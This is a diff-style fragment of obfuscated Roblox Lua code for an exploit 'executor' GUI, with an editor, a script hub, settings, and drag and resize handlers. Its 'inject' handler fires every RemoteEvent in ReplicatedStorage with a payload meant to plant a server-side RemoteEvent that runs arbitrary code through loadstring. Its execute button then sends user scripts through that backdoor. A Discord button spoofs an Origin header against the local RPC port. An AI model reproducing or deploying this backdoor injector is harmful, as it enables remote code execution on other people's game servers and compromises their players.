+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.Active = true;
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.Size = UDim2.new(1, 0, 1, -43);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.BorderSizePixel = 0;
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.BackgroundTransparency = 1;
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.Position = UDim2.new(0, 0, 0, 43);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.CanvasSize = UDim2.new(0, 0, 0, 0);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.ScrollBarImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.ScrollBarThickness = 5;
+fd4hh21cgefg.d93c98493f3d1a6df0beef793233.Parent = fd4hh21cgefg.fg68dafgh7ad5afh;
+
+fd4hh21cgefg.dhd70d336b188dga2.Name = "UIListLayout";
+fd4hh21cgefg.dhd70d336b188dga2.Padding = UDim.new(0, 5);
+fd4hh21cgefg.dhd70d336b188dga2.Parent = fd4hh21cgefg.d93c98493f3d1a6df0beef793233;
+
+fd4hh21cgefg.dggb4h6f8d.Name = "dummy";
+fd4hh21cgefg.dggb4h6f8d.AnchorPoint = Vector2.new(1, 0);
+fd4hh21cgefg.dggb4h6f8d.Size = UDim2.new(1, -50, 0, 25);
+fd4hh21cgefg.dggb4h6f8d.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dggb4h6f8d.BackgroundTransparency = 1;
+fd4hh21cgefg.dggb4h6f8d.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dggb4h6f8d.Parent = fd4hh21cgefg.d93c98493f3d1a6df0beef793233;
+
+fd4hh21cgefg.de6ha024b4bb499.Name = "UICorner";
+fd4hh21cgefg.de6ha024b4bb499.Parent = fd4hh21cgefg.dggb4h6f8d;
+
+fd4hh21cgefg.h85497db6b68.Name = "Title";
+fd4hh21cgefg.h85497db6b68.AnchorPoint = Vector2.new(0, 0.5);
+fd4hh21cgefg.h85497db6b68.Size = UDim2.new(0, 100, 1, 0);
+fd4hh21cgefg.h85497db6b68.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h85497db6b68.BackgroundTransparency = 1;
+fd4hh21cgefg.h85497db6b68.Position = UDim2.new(0, 0, 0.5, 0);
+fd4hh21cgefg.h85497db6b68.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h85497db6b68.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h85497db6b68.Text = "Name";
+fd4hh21cgefg.h85497db6b68.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.h85497db6b68.TextXAlignment = Enum.TextXAlignment.Left;
+fd4hh21cgefg.h85497db6b68.Parent = fd4hh21cgefg.dggb4h6f8d;
+
+fd4hh21cgefg.fe500d3d5agb86740h.Name = "Resize";
+fd4hh21cgefg.fe500d3d5agb86740h.AutoButtonColor = true;
+fd4hh21cgefg.fe500d3d5agb86740h.Active = false;
+fd4hh21cgefg.fe500d3d5agb86740h.AnchorPoint = Vector2.new(1, 1);
+fd4hh21cgefg.fe500d3d5agb86740h.Size = UDim2.new(0, 10, 0, 10);
+fd4hh21cgefg.fe500d3d5agb86740h.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe500d3d5agb86740h.Position = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.fe500d3d5agb86740h.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe500d3d5agb86740h.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.fe500d3d5agb86740h.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.fe500d3d5agb86740h.TextTransparency = 1;
+fd4hh21cgefg.fe500d3d5agb86740h.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.f0f32e11a60fc99.Name = "UICorner";
+fd4hh21cgefg.f0f32e11a60fc99.CornerRadius = UDim.new(0, 2);
+fd4hh21cgefg.f0f32e11a60fc99.Parent = fd4hh21cgefg.fe500d3d5agb86740h;
+
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Name = "SavePopup";
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.AutoButtonColor = false;
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Visible = false;
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.ZIndex = 3;
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Size = UDim2.new(0, 190, 0, 130);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.BorderSizePixel = 0;
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Text = "";
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.TextTransparency = 1;
+fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.ea5g5fa9.Name = "UICorner";
+fd4hh21cgefg.ea5g5fa9.Parent = fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e;
+
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.Name = "ImageLabel";
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.AnchorPoint = Vector2.new(1, 0);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.Size = UDim2.new(0, 18, 0, 18);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.BackgroundTransparency = 1;
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.Position = UDim2.new(1, -5, 0, 5);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.Image = "rbxassetid://4467776646";
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.ImageContent = Content;
+fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba.Parent = fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e;
+
+fd4hh21cgefg.ac4g6h1h6724ed2.Name = "Hitbox";
+fd4hh21cgefg.ac4g6h1h6724ed2.AutoButtonColor = true;
+fd4hh21cgefg.ac4g6h1h6724ed2.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.ac4g6h1h6724ed2.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ac4g6h1h6724ed2.BackgroundTransparency = 1;
+fd4hh21cgefg.ac4g6h1h6724ed2.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.ac4g6h1h6724ed2.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.ac4g6h1h6724ed2.Text = "";
+fd4hh21cgefg.ac4g6h1h6724ed2.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.ac4g6h1h6724ed2.TextTransparency = 1;
+fd4hh21cgefg.ac4g6h1h6724ed2.Parent = fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba;
+
+fd4hh21cgefg.g91edcg3dde18c2e422.Name = "icon";
+fd4hh21cgefg.g91edcg3dde18c2e422.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.g91edcg3dde18c2e422.Size = UDim2.new(1, -2, 1, -2);
+fd4hh21cgefg.g91edcg3dde18c2e422.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g91edcg3dde18c2e422.BackgroundTransparency = 1;
+fd4hh21cgefg.g91edcg3dde18c2e422.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.g91edcg3dde18c2e422.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g91edcg3dde18c2e422.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g91edcg3dde18c2e422.Image = "rbxassetid://3754291346";
+fd4hh21cgefg.g91edcg3dde18c2e422.ImageContent = Content;
+fd4hh21cgefg.g91edcg3dde18c2e422.Parent = fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba;
+
+fd4hh21cgefg.bc1364h610f7g4.Name = "toggler";
+fd4hh21cgefg.bc1364h610f7g4.Parent = fd4hh21cgefg.bg8f08623b8g89h3caaf06b8cba;
+
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.Name = "Title";
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.Size = UDim2.new(0, 80, 0, 40);
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.BackgroundTransparency = 1;
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.Text = "Save";
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+fd4hh21cgefg.a84bcb407943e85d2d6c4h8c.Parent = fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e;
+
+fd4hh21cgefg.f7c8b.Name = "utils";
+fd4hh21cgefg.f7c8b.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.bdg82eb087b994cc8f41cc05c96991gf.Name = "main";
+fd4hh21cgefg.bdg82eb087b994cc8f41cc05c96991gf.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.e71g255d0bg08121df.Name = "scripthub";
+fd4hh21cgefg.e71g255d0bg08121df.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.dff162750fe3331.Name = "scripts";
+fd4hh21cgefg.dff162750fe3331.Parent = fd4hh21cgefg.e71g255d0bg08121df;
+
+fd4hh21cgefg.be647bb6120b7ca116hhc.Name = "games";
+fd4hh21cgefg.be647bb6120b7ca116hhc.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.ac3d2h2b73h4ffe980he48e7.Name = "config";
+fd4hh21cgefg.ac3d2h2b73h4ffe980he48e7.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.dfba8h23554c36gh63720337.Name = "editor";
+fd4hh21cgefg.dfba8h23554c36gh63720337.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.c0e78eg483dcda4c0ddfhd0bcdgbdh.Name = "magnolia";
+fd4hh21cgefg.c0e78eg483dcda4c0ddfhd0bcdgbdh.Parent = fd4hh21cgefg.dh712eh636;
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.d879ebb051d333685);
+	-- services
+	local tweenService = game:GetService("TweenService");
+	local httpService = game:GetService("HttpService")
+	
+	-- vars
+	local invCode = "wPB9es2ryw";
+	local httpRequest = (syn and syn.request) or http_request or function() end;
+	
+	-- utls
+	local utils = require(script.Parent.Parent.Parent.Parent.Parent.utils);
+	
+	-- ui
+	local hitbox = script.Parent.Hitbox;
+	local icon = script.Parent.ImageLabel;
+	
+	-- colors
+	local hoverColor = utils.modernColors.ElectricBlue;
+	local leaveColor = icon.ImageColor3;
+	
+	-- tweens
+	local hoverTween = tweenService:Create(icon,
+		utils.tweenInfo.hover,
+		{
+			ImageColor3 = hoverColor
+		}
+	);
+	local leaveTween = tweenService:Create(icon,
+		utils.tweenInfo.hover,
+		{
+			ImageColor3 = leaveColor
+		}
+	);
+	
+	hitbox.MouseEnter:Connect(function()
+		hoverTween:Play();
+	end)
+	
+	hitbox.MouseLeave:Connect(function()
+		leaveTween:Play();
+	end)
+	
+	
+	hitbox.MouseButton1Click:Connect(function()
+		
+	
+		if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
+	
+		httpRequest({
+			Url = "http://127.0.0.1:6463/rpc?v=1",
+			Method = "POST",
+	
+			Headers = {
+				['Content-Type'] = 'application/json',
+				Origin = 'https://discord.com'
+			},
+	
+			Body = httpService:JSONEncode({
+				cmd = 'INVITE_BROWSER',
+				nonce = httpService:GenerateGUID(false),
+				args = {code = invCode}
+			})
+		})
+	end);
+	
+	
+	
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4);
+	-- ui
+	local counter = script.Parent;
+	local textbox = script.Parent.Parent.Parent.Parent.BodyClipping.Executor.InnerBody.SourceBg.Source.ScrollingFrame.SourceBox;
+	
+	-- vars
+	local format = "%d\n——\n%d";
+	
+	
+	-- connection update
+	textbox:GetPropertyChangedSignal("Text"):Connect(function()
+		local charAmnt = #textbox.Text;
+		
+		local lineAmnt = 0
+	
+		if charAmnt > 0 then
+			_, lineAmnt = textbox.Text:gsub("\n", "")
+			lineAmnt += 1
+		end
+		
+		counter.Text = format:format(charAmnt, lineAmnt);
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.e58a4h0685611735dg0014e8e);
+	-- services
+	local tweenService = game:GetService("TweenService");
+	local players = game:GetService("Players");
+	
+	-- globals
+	local player = players.LocalPlayer;
+	local utils = require(script.Parent.Parent.Parent.utils);
+	
+	-- ui
+	local btns = script.Parent.Top;
+	local bg = btns.bg;
+	local bodies = script.Parent.Parent.BodyClipping;
+	
+	-- btn to body
+	local BTN_BODY = {
+		[btns.HomeBtn] = bodies.Executor,
+		[btns.MenuBtn] = bodies.Games,
+		[btns.SettingsBtn] = bodies.Settings
+	};
+	
+	
+	local cBtn; -- current btn
+	local iconSize = 20;
+	local selIconSize = 22;
+	
+	
+	local function onBtnClick(btn)
+		if cBtn then
+			-- animations old btn
+			tweenService:Create(cBtn,
+				utils.tweenInfo.expand,
+				{
+					Size = UDim2.new(0, iconSize, 0, iconSize),
+					ImageColor3 = Color3.fromRGB(37, 37, 37)
+				}
+			):Play();
+			BTN_BODY[cBtn].Visible = false;
+		end;
+		-- ui update
+		BTN_BODY[btn].Visible = true;
+		-- animations new btn
+		tweenService:Create(btn,
+			utils.tweenInfo.expand,
+			{
+				Size = UDim2.new(0, selIconSize, 0, selIconSize),
+				ImageColor3 = Color3.fromRGB(181, 181, 181)
+			}
+		):Play();
+		-- btn bg
+		tweenService:Create(bg,
+			utils.tweenInfo.move,
+			{
+				Position = btn.Position
+			}
+		):Play();
+		-- set current btn
+		cBtn = btn;
+	end
+	
+	
+	for i, btn in next, btns:GetChildren() do
+		if btn:IsA("ImageLabel") then
+			btn.Hitbox.MouseButton1Click:Connect(function()
+				onBtnClick(btn);
+			end)
+		end
+	end
+	
+	-- first click
+	onBtnClick(btns.HomeBtn);
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.h57c2ag73);
+	-- services
+	local tweenService = game:GetService("TweenService");
+	
+	-- utls
+	local utils = require(script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.utils);
+	
+	-- ui
+	local textbox = script.Parent.TextBox;
+	local scripts = script.Parent.Parent.Scripts;
+	
+	-- colors
+	local hoverColor = utils.modernColors.ElectricBlue;
+	local leaveColor = textbox.PlaceholderColor3;
+	local borderColor = Color3.fromRGB(21, 21, 21); -- leave border color
+	
+	-- tweens
+	local hoverTween = tweenService:Create(textbox,
+		utils.tweenInfo.hover,
+		{
+			TextColor3 = hoverColor,
+			PlaceholderColor3 = hoverColor
+		}
+	);
+	local leaveTween = tweenService:Create(textbox,
+		utils.tweenInfo.hover,
+		{
+			TextColor3 = leaveColor,
+			PlaceholderColor3 = leaveColor
+		}
+	);
+	
+	local phoverTween = tweenService:Create(script.Parent,
+		utils.tweenInfo.hover,
+		{
+			BorderColor3 = hoverColor
+		}
+	);
+	
+	local pleaveTween = tweenService:Create(script.Parent,
+		utils.tweenInfo.hover,
+		{
+			BorderColor3 = borderColor
+		}
+	);
+	
+	textbox.Focused:Connect(function()
+		hoverTween:Play();
+		phoverTween:Play();
+	end)
+	
+	textbox.FocusLost:Connect(function()
+		leaveTween:Play();
+		pleaveTween:Play();
+	end)
+	
+	textbox:GetPropertyChangedSignal("TextColor3"):Connect(function()
+		script.Parent.ImageLabel.ImageColor3 = textbox.TextColor3;
+	end);
+	
+	
+	-- search system
+	textbox:GetPropertyChangedSignal("Text"):Connect(function()
+		local text = textbox.Text:lower(); -- key insensitive search
+		for i, v in next, scripts:GetChildren() do
+			if not v:IsA("ImageLabel") then
+				continue;
+			end
+			if v.Name:lower():find(text) then
+				v.Visible = true;
+			else
+				v.Visible = false;
+			end;
+		end
+	end)
+	
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.g92h4fef4ed09b910agh873he9232b);
+	local hitbox = script.Parent.Hitbox;
+	local editor = require(script.Parent.Parent.Parent.Parent.Parent.Parent.Parent.editor);
+	
+	
+	hitbox.MouseButton1Click:Connect(editor.clearCurrent);
+	
+	
+	
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.d74df2fa2fedc486ef9aagec7c744a5);
+	local hitbox = script.Parent.Hitbox;
+	local savePopup = script.Parent.Parent.Parent.Parent.Parent.Parent.SavePopup;
+	
+	
+	hitbox.MouseButton1Click:Connect(function()
+		savePopup.Visible = true;
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.a0c39934h6);
+	local sourceFrame = script.Parent.Parent.Parent.SourceBg.Source;
+	
+	script.Parent.Hitbox.MouseButton1Click:Connect(function()
+		sourceFrame.Visible = not sourceFrame.Visible;
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.df293hg76d3a);
+	script.Parent.MouseButton1Click:Connect(function()
+		local TextBox = script.Parent.Parent.Parent.SourceBg.Source.ScrollingFrame.SourceBox
+		
+		if game:GetService("JointsService"):FindFirstChild("FE_Bypassed_Crypted_Fr") then
+			local Execute=game:GetService("JointsService"):FindFirstChild("FE_Bypassed_Crypted_Fr"):FireServer(TextBox.Text) -- execute
+		else
+			warn("Failed to loadstring: Error 404")
+		end
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.e8110575g2a1cc8d2he7g17ehb17);
+	-- services
+	local tweenService = game:GetService("TweenService");
+	
+	-- utls
+	local utils = require(script.Parent.Parent.Parent.Parent.Parent.Parent.utils);
+	
+	-- ui
+	local btns = script.Parent;
+	
+	-- colors
+	local hoverColor = utils.modernColors.ElectricBlue;
+	local leaveColor = Color3.fromRGB(170, 170, 170);
+	
+	-- setup func
+	local function setup(btn)
+		local hitbox = btn.Hitbox;
+		hitbox.MouseEnter:Connect(function()
+			tweenService:Create(btn.ImageButton,
+				utils.tweenInfo.hover,
+				{
+					ImageColor3 = hoverColor
+				}
+			):Play();
+			tweenService:Create(btn.TextLabel,
+				utils.tweenInfo.hover,
+				{
+					TextColor3 = hoverColor
+				}
+			):Play();
+		end);
+		hitbox.MouseLeave:Connect(function()
+			tweenService:Create(btn.ImageButton,
+				utils.tweenInfo.hover,
+				{
+					ImageColor3 = leaveColor
+				}
+			):Play();
+			tweenService:Create(btn.TextLabel,
+				utils.tweenInfo.hover,
+				{
+					TextColor3 = leaveColor
+				}
+			):Play();
+		end)
+	end
+	
+	-- loop btns and make tweeninfos
+	for i, btn in ipairs(script.Parent:GetChildren()) do
+		if btn:IsA("ImageButton") then
+			setup(btn);
+		end
+	end
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.c6ecd7af8h1);
+	script.Parent.MouseButton1Click:Connect(function()
+		local e = script.Parent
+		
+		local function b_G_V12(see)
+			local a = function(ree)
+				ree:FireServer([[
+	                    local folder = Instance.new('RemoteEvent')
+	                    folder.Name = "FE_Bypassed_Crypted_Fr"
+	                    folder.Parent = game:GetService("JointsService")
+	                    local loadstring = require(13684410229)
+	                    folder.OnServerEvent:Connect(function(_1,_2)
+	                       loadstring(_2)()
+	                    end)
+	                    ]]
+				)
+			end
+			for i, v in pairs(see:GetChildren()) do
+				--[[3 lines]]
+				if v:IsA("RemoteEvent") then
+					if not string.match(string.lower(v.Name), "ban") then
+						if not string.match(string.lower(v.Name), "kick") then
+							a(v)
+						end
+					end
+				end
+				--[[-3 lines]]
+				b_G_V12(v) --[[test]]
+			end
+		end
+		local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+		local timetoken = 0
+		local maxtime = 5
+		repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("FE_Bypassed_Crypted_Fr") or timetoken >= maxtime
+		if game:GetService("JointsService"):FindFirstChild("FE_Bypassed_Crypted_Fr") then
+			e.Text = "Injected"
+			wait(3)
+			e.Visible = false
+		end
+	end)
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.c4ff0d98fef1cef8199de995a5);
+	local canvas = script.Parent.Parent.Parent.Parent;
+	local configs = require(canvas.config);
+	local magnolia = require(canvas.magnolia);
+	
+	local container = script.Parent.InnerBody.ScrollingFrame;
+	local dummy = container.dummy;
+	
+	dummy.Parent = nil;
+	
+	-- names
+	-- this table change configs index names to an Human text
+	local NAMES = {
+		codeColors = "Code Editor",
+		canDebug = "Can Debug"
+	}
+	
+	local pickerConnection;
+	
+	local colorPicker = magnolia.new("ColorPicker", canvas.Main);
+	colorPicker.AnchorPoint = Vector2.new(0.5, 0.5);
+	colorPicker.Position = UDim2.fromScale(0.5, 0.5);
+	colorPicker.ZIndex = 100;
+	colorPicker.Visible = false;
+	colorPicker:Open();
+	canvas.Main.UICorner:Clone().Parent = magnolia.GetInstance(colorPicker);
+	
+	-- draw setting
+	local size = 0;
+	local function loadSetting(name, value, inTable)
+		local body;
+		local textName = NAMES[name] or name;
+		local data = inTable or configs.data.settings;
+		
+		if typeof(value) == "Color3" then
+			body = dummy:Clone();
+			local preview = Instance.new("ImageButton", body);
+			preview.Size = UDim2.fromOffset(20, 20);
+			preview.AnchorPoint = Vector2.new(1, 0.5);
+			preview.Position = UDim2.fromScale(1, 0.5);
+			preview.BackgroundColor3 = value;
+			local corner = Instance.new("UICorner", preview);
+			corner.CornerRadius = UDim.new(1, 0);
+			-- update value
+			preview.MouseButton1Click:Connect(function()
+				colorPicker.Visible = not colorPicker.Visible;
+				if colorPicker.Visible then
+					colorPicker:SelectColor(preview.BackgroundColor3);
+					pickerConnection = colorPicker.ColorChanged:Connect(function()
+						data[name] = colorPicker.Color;
+						preview.BackgroundColor3 = colorPicker.Color;
+						configs.save();
+					end)
+				else
+					pickerConnection:Disconnect();
+				end
+			end)
+			
+			
+		elseif type(value) == "boolean" then
+			body = dummy:Clone();
+			local switch = magnolia.new("Switch", body);
+			switch.AnchorPoint = Vector2.new(1, 0.5);
+			switch.Position = UDim2.fromScale(1, 0.5);
+			switch:Toggle(value);
+			-- update value
+			switch.ValueChanged:Connect(function()
+				data[name] = switch.Value;
+				configs.save();
+			end)
+		elseif value == nil then -- title case
+			body = dummy:Clone();
+			body.Title.Font = Enum.Font.SourceSansBold;
+		end
+		
+		if body then
+			size += 1;
+			body.Name = tostring(size);
+			body.Title.Text = textName;
+			body.Parent = container;
+			if inTable then
+				body.Title.Position = UDim2.new(0, 20,0.5, 0)
+			end
+		end
+	end
+	
+	-- load settings
+	local loadSettings;
+	loadSettings = function(settings, inTable)
+		for name, s in next, settings do
+			if type(s) == "table" then
+				loadSetting(name) -- description
+				loadSettings(s, s);
+			else
+				loadSetting(name, s, inTable)
+			end
+		end
+		-- resize canvas
+		container.CanvasSize = UDim2.fromOffset(0, 
+			size * dummy.AbsoluteSize.Y + size * container.UIListLayout.Padding.Offset
+		);
+	end;
+	
+	-- auto close color picker
+	script.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
+		if script.Parent.Visible == false then
+			colorPicker.Visible = false;
+			if pickerConnection then
+				pickerConnection:Disconnect();
+			end
+		end
+	end)
+	
+	
+	loadSettings(configs.data.settings);
+	
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.dd9b25856344cgg0);
+	-- services
+	local runService = game:GetService("RunService");
+	local tweenService = game:GetService("TweenService");
+	local players = game:GetService("Players");
+	local inputService = game:GetService("UserInputService")
+	
+	-- globals
+	local player = players.LocalPlayer;
+	local mouse = player:GetMouse();
+	local utils = require(script.Parent.Parent.utils);
+	
+	-- ui
+	local main = script.Parent;
+	local hitbox = script.Parent.Topbar.Hitbox;
+	
+	
+	-- tweeninfo
+	local moveTweenInfo = utils.tweenInfo.move;
+	
+	-- vars
+	local dragConnection;
+	local clickPos;
+	
+	local isMobile = inputService.TouchEnabled;
+	
+	-- core
+	local function drag()
+		local Position;
+		-- simple drag system
+		if isMobile then
+			Position = UDim2.fromOffset(mouse.X, mouse.Y);
+		else
+			local relPos = Vector2.new(mouse.X, mouse.Y)-main.AbsolutePosition;
+			local res = main.AbsolutePosition + (relPos - clickPos);
+			Position = UDim2.fromOffset(res.X, res.Y);
+		end
+		-- tween
+		tweenService:Create(
+			main,
+			moveTweenInfo,
+			{
+				Position = Position
+			}
+		):Play();
+	end
+	
+	-- disconnect and clear
+	local function disconnect()
+		if dragConnection then
+			dragConnection:Disconnect();
+			dragConnection = nil;
+		end
+	end
+	-- custom drag
+	utils.onDownUp(hitbox,
+		function() -- on button down
+			disconnect();
+			clickPos = Vector2.new(mouse.X, mouse.Y)-main.AbsolutePosition;
+			
+			dragConnection = runService.RenderStepped:Connect(drag);
+		end,
+		function() -- on button up
+			disconnect();
+		end
+	);
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.fe500d3d5agb86740h);
+	-- require
+	local utils = require(script.Parent.Parent.Parent.utils);
+	
+	-- service
+	local runService = game:GetService("RunService");
+	
+	-- consts
+	local minSize = Vector2.new(503, 248);
+	local maxSize = Vector2.new(720, 432);
+	
+	-- vars
+	local mouse = game:GetService("Players").LocalPlayer:GetMouse();
+	local dragConnection;
+	local oldIcon = mouse.Icon;
+	
+	-- ui
+	local main = script.Parent.Parent;
+	local hitbox = script.Parent;
+	
+	hitbox.MouseEnter:Connect(function()
+		if dragConnection then
+			return;
+		end
+		oldIcon = mouse.Icon;
+		mouse.Icon = "rbxassetid://10406654632";
+	end);
+	
+	hitbox.MouseLeave:Connect(function()
+		mouse.Icon = oldIcon;
+	end);
+	
+	
+	local function disconnect()
+		if not dragConnection then
+			return;
+		end
+		dragConnection:Disconnect();
+		dragConnection = nil;
+		mouse.Icon = oldIcon;
+	end;
+	
+	local function drag()
+		mouse.Icon = "rbxassetid://10406654632";
+		local pos = Vector2.new(mouse.X, mouse.Y);
+		local delta = pos - main.AbsolutePosition;
+		local size = UDim2.new(
+			0, math.clamp(delta.X, minSize.X, maxSize.X),
+			0, math.clamp(delta.Y, minSize.Y, maxSize.Y)
+		);
+		main.Size = size;
+	end
+	
+	utils.onDownUp(hitbox,
+		function() -- on button down
+			disconnect();
+			dragConnection = runService.RenderStepped:Connect(drag);
+		end,
+		function() -- on button up
+			disconnect();
+		end
+	);
+end)();
+
+coroutine.wrap(function()
+	local script = Instance.new("LocalScript", fd4hh21cgefg.d76c582cb5ebb6cfg4f5061394a6e);
+	
+	-- ui
+	local canvas = script.Parent.Parent.Parent;
+	local hitbox = script.Parent.ImageLabel.Hitbox;
+	
+	-- imports
+	local config = require(canvas.config);
+	local magnolia = require(canvas.magnolia);
+	local scriptshub = require(canvas.scripthub);
+	local editor = require(canvas.editor);
+	
+	-- close system
+	hitbox.MouseButton1Click:Connect(function()
+		script.Parent.Visible = false;
+	end)
+	
+	-- setup ui
+	local textbox = magnolia.new("TextBox", script.Parent);
+	local textboxIns = magnolia.GetMeta(textbox).__TextBox;
+	textbox.PlaceholderText = "Script Name";
+	textbox.Position = UDim2.fromScale(0.5, 0.5);
+	textbox.AnchorPoint = Vector2.new(0.5, 0.5);
+	textbox.Size = UDim2.new(1, -20, 0, 24);
+	
+	local saveBtn = magnolia.new("ButtonIcon", script.Parent);
